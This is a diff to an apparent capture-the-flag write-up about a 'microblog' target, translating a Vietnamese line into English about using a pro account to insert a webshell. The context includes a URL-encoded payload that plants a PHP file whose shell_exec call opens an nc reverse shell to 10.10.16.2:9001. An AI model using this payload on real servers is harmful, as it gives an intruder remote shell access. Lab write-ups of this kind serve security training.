@@ -260,7 +260,7 @@ function provisionProUser() {
 }
 
 ```
-Với tài khoản pro, chúng ta có thể chèn webshell. 
+With the pro account, we can insert webshell. 
 ```bash
 id=/var/www/microblog/hacker/uploads/rev.php&header=%3C%3Fphp+echo+shell_exec%28%22rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7Csh+-i+2%3E%261%7Cnc+10.10.16.2+9001+%3E%2Ftmp%2Ff%22%29%3B%3F%3E
 ```
